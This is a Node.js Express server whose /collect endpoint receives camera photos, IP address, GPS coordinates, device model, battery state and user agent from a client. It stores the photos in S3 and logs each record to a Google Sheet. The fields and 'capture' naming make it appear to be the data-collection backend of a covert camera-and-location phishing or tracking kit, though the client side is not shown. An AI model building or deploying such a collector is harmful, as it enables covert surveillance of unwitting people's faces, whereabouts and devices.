const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const AWS = require('aws-sdk');
const { google } = require('googleapis');
const { nanoid } = require('nanoid');
require('dotenv').config();

const app = express();

// --- CONFIGURATION ---
app.use(cors({ origin: process.env.ALLOWED_ORIGIN }));
app.use(bodyParser.json({ limit: '50mb' })); // Increased limit for 4 photos

// AWS S3 Setup
const s3 = new AWS.S3({
  accessKeyId: process.env.AWS_ACCESS_KEY_ID,
  secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
  region: process.env.AWS_REGION
});

// Google Sheets Setup
const auth = new google.auth.JWT(
  process.env.GOOGLE_CLIENT_EMAIL,
  null,
  process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n'), // Fixes private key formatting
  ['https://www.googleapis.com/auth/spreadsheets']
);
const sheets = google.sheets({ version: 'v4', auth });

// --- MAIN ENDPOINT ---
app.post('/collect', async (req, res) => {
  try {
    const data = req.body;
    const timestamp = new Date().toLocaleString("en-IN", {timeZone: "Asia/Kolkata"});
    let imageLinks = [];

    // 1. Process and Upload Photos to AWS S3
    if (data.photos && data.photos.length > 0) {
      for (let i = 0; i < data.photos.length; i++) {
        const base64Data = data.photos[i].split(',')[1];
        const buffer = Buffer.from(base64Data, 'base64');
        const fileName = `capture_${Date.now()}_${i}.jpg`;

        const uploadParams = {
          Bucket: process.env.S3_BUCKET,
          Key: fileName,
          Body: buffer,
          ContentType: 'image/jpeg'
        };

        const uploadResult = await s3.upload(uploadParams).promise();
        imageLinks.push(uploadResult.Location); // Direct URL to the image
      }
    }

    // 2. Log Data to Google Sheets
    const row = [
      timestamp,
      data.ip,
      data.lat,
      data.lon,
      data.deviceModel,
      data.battery + "%",
      data.charging ? "Charging" : "Unplugged",
      imageLinks.join(' | '), // All 4 photo links in one cell
      data.userAgent
    ];

    await sheets.spreadsheets.values.append({
      spreadsheetId: process.env.GOOGLE_SHEET_ID,
      range: 'Sheet1!A1',
      valueInputOption: 'RAW',
      requestBody: { values: [row] }
    });

    console.log(`Success: Data logged for IP ${data.ip}`);
    res.status(200).json({ status: 'success' });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
